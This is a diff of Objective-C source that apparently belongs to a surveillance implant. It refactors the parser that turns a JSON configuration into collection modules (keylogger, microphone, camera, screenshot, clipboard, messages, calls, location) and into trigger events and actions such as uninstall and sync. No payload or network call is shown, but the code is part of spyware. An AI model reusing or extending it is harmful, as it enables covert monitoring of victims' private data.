@@ -10,45 +10,63 @@
 #import "RCSMCommon.h"
 #import "RCSIJSonConfiguration.h"
 
-#define DEBUG_JSON_CONFIG_
+//#define DEBUG_JSON_CONFIG_
 
-@implementation SBJSonConfigDelegate
+@interface SBJSonConfigDelegate (hidden)
 
-- (id)init
-{
-  self = [super init];
-  
-  if (self) {
-    adapter = [[SBJsonStreamParserAdapter alloc] init];
-    adapter.delegate = (id)self;
-    
-    parser = [[SBJsonStreamParser alloc] init];
-    parser.delegate = adapter;
-    
-//    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
-//    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
-//    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
-  }
-  
-  return self;
-}
+- (void)initFileModule: (NSDictionary *)aModule;
+- (void)initABModule: (NSDictionary *)aModule;
+- (void)initDeviceModule: (NSDictionary *)aModule;
+- (void)initPositionModule: (NSDictionary *)aModule;
+- (void)initCalllistModule: (NSDictionary *)aModule;
+- (void)initCalendarModule: (NSDictionary *)aModule;
+- (void)initMicModule: (NSDictionary *)aModule;
+- (void)initCameraModule: (NSDictionary *)aModule;
+- (void)initScrshotModule: (NSDictionary *)aModule;
+- (void)initUrlModule: (NSDictionary *)aModule;
+- (void)initMouseModule: (NSDictionary *)aModule;
+- (void)initChatModule: (NSDictionary *)aModule;
+- (void)initAppModule: (NSDictionary *)aModule;
+- (void)initKeyLogModule: (NSDictionary *)aModule;
+- (void)initClipboardModule: (NSDictionary *)aModule;
+- (void)initMessagesModule: (NSDictionary *)aModule;
+- (void)initCallModule: (NSDictionary *)aModule;
 
-- (void)dealloc
-{
-//  [mEventsList release];
-//  [mAgentsList release];
-//  [mActionsList release];
-  
-  [parser release];
-  [adapter release];
-  [super dealloc];
-}
+- (NSTimeInterval)calculateMsecFromMidnight:(NSString*)aDate;
+- (void)addProcessEvent: (NSDictionary *)anEvent;
+- (int64_t)calculateWinDate:(NSString*)aDate;
+- (int64_t)calculateDaysDate:(NSNumber*)aDay;
+- (u_int)timerGetSubtype:(NSDictionary*)anEvent;
+- (void)addTimerEvent: (NSDictionary *)anEvent;
+- (void)addStandbyEvent: (NSDictionary *)anEvent;
+- (void)addSimchangeEvent: (NSDictionary *)anEvent;
+- (void)addConnectionEvent: (NSDictionary *)anEvent;
+- (void)addBatteryEvent: (NSDictionary *)anEvent;
+- (void)addACEvent: (NSDictionary *)anEvent;
+- (void)addIdleEvent: (NSDictionary *)anEvent;
+- (void)addNULLEvent: (NSDictionary *)anEvent;
+- (void)addQuotaEvent: (NSDictionary *)anEvent;
+
+- (NSMutableDictionary *)initActionUninstall:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionInfolog:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionModule:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionSync:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionEvent:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionCommand:(NSDictionary *)subAction;
+- (NSMutableArray *)initSubActions:(NSArray *)subactions;
+- (NSMutableDictionary *)initSubActions:(NSArray *)subactions 
+                              forAction:(NSNumber *)actionNum;
+
+@end
+
+@implementation SBJSonConfigDelegate (hidden)
 
 #
 #
-#pragma mark Modules parsing
+# pragma mark Modules parsing
 #
 #
+
 typedef struct _fileConfiguration {
   u_int minFileSize;
   u_int maxFileSize;
@@ -914,102 +932,6 @@ typedef struct  {
   [pool release];
 }
 
-- (void)parseAndAddModules:(NSDictionary *)dict
-{  
-  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
-  
-  if (modulesArray == nil) 
-    {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no modulesArray found", __FUNCTION__);
-#endif
-    return;
-    }
-  
-  for (int i=0; i < [modulesArray count]; i++) 
-    {
-    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
-    
-    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
-    
-    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
-    
-    if (moduleType != nil)
-      {
-      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
-        {
-          [self initABModule: module];
-        }
-      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
-        {
-          [self initDeviceModule: module];
-        }
-      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
-        {
-          [self initCalllistModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
-        {
-          [self initCalendarModule: module];
-        }
-      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
-        {
-          [self initMicModule: module];
-        }
-      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
-        {
-          [self initScrshotModule: module];
-        }
-      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
-        {
-          [self initUrlModule: module];
-        }
-      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
-        {
-          [self initAppModule: module];
-        }      
-      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
-        {
-          [self initKeyLogModule: module];
-        }
-      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
-        {
-          [self initMessagesModule: module];
-        }
-      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
-        {
-          [self initClipboardModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
-        {
-          [self initCameraModule: module];
-        }
-      else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
-        {
-          [self initPositionModule: module];
-        }
-      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
-        {
-          [self initChatModule: module];
-        }
-      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
-        {
-          [self initMouseModule: module];
-        }
-      else if ([moduleType compare: @"call"] == NSOrderedSame) 
-        {
-          [self initCallModule: module];
-        }
-      else if ([moduleType compare: @"file"] == NSOrderedSame) 
-        {
-          [self initFileModule: module];
-        }
-      }
-    
-    [inner release];
-    }
-}
-
 #
 #
 #pragma mark Events parsing
@@ -1019,6 +941,7 @@ typedef struct  {
 #define EVENT_PROCESS_ON_PROC   0x00000000
 #define EVENT_PROCESS_ON_WINDOW 0x00000001
 #define EVENT_PROCESS_ON_FOCUS  0x00000002  
+
 // Done. check comments.
 - (void)addProcessEvent: (NSDictionary *)anEvent
 {
@@ -1265,6 +1188,8 @@ typedef struct  {
 // TIMER_DATE, TIMER_INST -> EVENTS_TIMER_DATE_KEY, EVENTS_TIMER_AFTERINST_KEY
 // TIMER_AFTER_STARTUP, TIMER_LOOP, TIMER_DAILY -> EVENTS_TIMER_KEY
 // Done.
+
+
 - (void)addTimerEvent: (NSDictionary *)anEvent
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -1904,81 +1829,6 @@ typedef struct {
   [pool release];
 }
 
-- (void)parseAndAddEvents:(NSDictionary *)dict
-{
-  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
-  
-  if (eventsArray == nil) 
-    return;
-  
-  for (int i=0; i < [eventsArray count]; i++) 
-    {
-    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
-    
-    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
-    
-    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
-    
-    if (eventType != nil)
-      {     
-        if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
-          {
-            [self addProcessEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
-          {
-            [self addTimerEvent: event];
-          }
-        else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
-          {
-            [self addStandbyEvent: event];
-          }
-        else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
-          {
-            [self addConnectionEvent: event];
-          }
-        else if ([eventType compare: EVENTS_QUOTA_KEY] == NSOrderedSame) 
-          {
-            [self addQuotaEvent: event];
-          }
-        else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addSimchangeEvent: event];
-          }
-        else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addBatteryEvent: event];
-          }
-        else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
-          {
-            // only iOS
-            [self addACEvent: event];
-          }
-        else if ([eventType compare: EVENTS_IDLE_KEY] == NSOrderedSame) 
-          {
-            [self addIdleEvent: event];
-          }
-        else
-          { // Default event: for keep order number in list when a actionEvent is triggered
-            // : the trigger param is position in list of event
-            [self addNULLEvent: event];
-          }
-      }
-    
-    [inner release];
-    }
-  
-}
 
 #
 #
@@ -2013,7 +1863,7 @@ typedef struct {
   
   NSString *infoText = [subAction objectForKey: ACTION_INFO_TEXT_KEY];
   
-  int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
+  //int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
   
   //[data appendBytes: &len length:sizeof(int32_t)];
   
@@ -2325,6 +2175,40 @@ typedef struct {
   return newAction;
 }
 
+@end
+
+@implementation SBJSonConfigDelegate
+
+- (id)init
+{
+  self = [super init];
+  
+  if (self) {
+    adapter = [[SBJsonStreamParserAdapter alloc] init];
+    adapter.delegate = (id)self;
+    
+    parser = [[SBJsonStreamParser alloc] init];
+    parser.delegate = adapter;
+    
+    //    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
+    //    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
+    //    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
+  }
+  
+  return self;
+}
+
+- (void)dealloc
+{
+  //  [mEventsList release];
+  //  [mAgentsList release];
+  //  [mActionsList release];
+  
+  [parser release];
+  [adapter release];
+  [super dealloc];
+}
+
 - (void)parseAndAddActions:(NSDictionary *)dict
 {  
   NSArray *actionsArray = [dict objectForKey: ACTIONS_KEY];
@@ -2351,9 +2235,181 @@ typedef struct {
     }
 }
 
+- (void)parseAndAddEvents:(NSDictionary *)dict
+{
+  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
+  
+  if (eventsArray == nil) 
+    return;
+  
+  for (int i=0; i < [eventsArray count]; i++) 
+  {
+    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
+    
+    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
+    
+    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
+    
+    if (eventType != nil)
+    {     
+      if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
+      {
+        [self addProcessEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
+      {
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
+      {
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
+      {
+        [self addTimerEvent: event];
+      }
+      else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
+      {
+        [self addStandbyEvent: event];
+      }
+      else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
+      {
+        [self addConnectionEvent: event];
+      }
+      else if ([eventType compare: EVENTS_QUOTA_KEY] == NSOrderedSame) 
+      {
+        [self addQuotaEvent: event];
+      }
+      else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
+      {
+        // only iOS
+        [self addSimchangeEvent: event];
+      }
+      else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
+      {
+        // only iOS
+        [self addBatteryEvent: event];
+      }
+      else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
+      {
+        // only iOS
+        [self addACEvent: event];
+      }
+      else if ([eventType compare: EVENTS_IDLE_KEY] == NSOrderedSame) 
+      {
+        [self addIdleEvent: event];
+      }
+      else
+      { // Default event: for keep order number in list when a actionEvent is triggered
+        // : the trigger param is position in list of event
+        [self addNULLEvent: event];
+      }
+    }
+    
+    [inner release];
+  }
+  
+}
+
+- (void)parseAndAddModules:(NSDictionary *)dict
+{  
+  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
+  
+  if (modulesArray == nil) 
+  {
+#ifdef DEBUG_JSON_CONFIG
+    NSLog(@"%s: no modulesArray found", __FUNCTION__);
+#endif
+    return;
+  }
+  
+  for (int i=0; i < [modulesArray count]; i++) 
+  {
+    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+    
+    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
+    
+    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
+    
+    if (moduleType != nil)
+    {
+      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
+      {
+        [self initABModule: module];
+      }
+      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
+      {
+        [self initDeviceModule: module];
+      }
+      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
+      {
+        [self initCalllistModule: module];
+      }
+      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
+      {
+        [self initCalendarModule: module];
+      }
+      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
+      {
+        [self initMicModule: module];
+      }
+      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
+      {
+        [self initScrshotModule: module];
+      }
+      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
+      {
+        [self initUrlModule: module];
+      }
+      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
+      {
+        [self initAppModule: module];
+      }      
+      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
+      {
+        [self initKeyLogModule: module];
+      }
+      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
+      {
+        [self initMessagesModule: module];
+      }
+      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
+      {
+        [self initClipboardModule: module];
+      }
+      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
+      {
+        [self initCameraModule: module];
+      }
+      else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
+      {
+        [self initPositionModule: module];
+      }
+      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
+      {
+        [self initChatModule: module];
+      }
+      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
+      {
+        [self initMouseModule: module];
+      }
+      else if ([moduleType compare: @"call"] == NSOrderedSame) 
+      {
+        [self initCallModule: module];
+      }
+      else if ([moduleType compare: @"file"] == NSOrderedSame) 
+      {
+        [self initFileModule: module];
+      }
+    }
+    
+    [inner release];
+  }
+}
+
 #
 #
-#pragma mark SBJsonStreamParserAdapterDelegate methods
+# pragma mark SBJsonStreamParserAdapterDelegate methods
 #
 #
 
@@ -2462,6 +2518,5 @@ typedef struct {
   
   return  bRet;
 }
-
 
 @end
